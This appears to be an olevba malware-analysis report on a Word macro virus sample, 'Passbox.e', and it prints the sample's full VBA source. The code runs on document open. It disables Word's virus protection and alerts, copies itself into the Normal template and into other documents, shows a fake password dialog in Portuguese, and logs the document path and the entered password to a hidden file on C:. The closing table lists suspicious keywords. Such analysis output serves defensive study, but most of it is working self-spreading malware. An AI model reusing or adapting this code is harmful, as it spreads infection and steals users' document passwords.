olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Angelo.bas 
in file: Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19 - OLE stream: 'Macros/VBA/Angelo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Final
       
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone

   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   
   Application.EnableCancelKey = wdCancelDisabled
      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate

   DocumentInstalled = False
   GlobalInstalled = False
       
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "Angelo" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Angelo" Then
         GlobalInstalled = True
      End If
   Next
   
      If DocumentInstalled = False Then
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If GlobalInstalled = False Then
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
      
      ''''
      
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   
   DocumentInstalled = False
   GlobalInstalled = False
   
   For I = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(I).Name = "Ômega" Then
         DocumentInstalled = True
      End If
   Next

   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
         GlobalInstalled = True
      End If
   Next
   
      If GlobalInstalled = True Then
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
      End If
           
     
      If DocumentInstalled = True Then
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
         Options.SaveNormalPrompt = False
      End If
    
      If ActiveDocument.HasPassword = False Then GoTo Final
      PassBox.Show
 
Final:
    End Sub
Sub Analise()
If PassBox.TextBox1 = "" Then
   ActiveDocument.Close
   Unload PassBox
   Else
   Grava
End If

End Sub
Sub Grava()
On Error Resume Next
SetAttr "C:\IO.SDX", 0
Open "C:\IO.SDX" For Append As #1
Print #1, "Path = " + ActiveDocument.FullName
Print #1, "Password = " + PassBox.TextBox1
Print #1, ""InputB
Close #1
SetAttr "C:\IO.SDX", 1 + 2 + 4

Unload PassBox
Application.DisplayAlerts = wdAlertsAll

End Sub
-------------------------------------------------------------------------------
VBA MACRO PassBox.frm 
in file: Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19 - OLE stream: 'Macros/VBA/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


























































Private Sub CommandButton1_Click()
If CommandButton1.Caption = "OK" Then Analise
End Sub
Private Sub TextBox1_Change()
TextBox1.PasswordChar = "*"

End Sub
Private Sub UserForm_Initialize()
Label2.Caption = "Insira a senha para abrir o arquivo"
Label1.Caption = ActiveDocument.FullName

End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
On Error GoTo Final
Analise

Final:
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Passbox.e-a7cdd8768ac48fb4c8b9fde928bc6bfc0c439e19' - OLE stream: 'Macros/PassBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
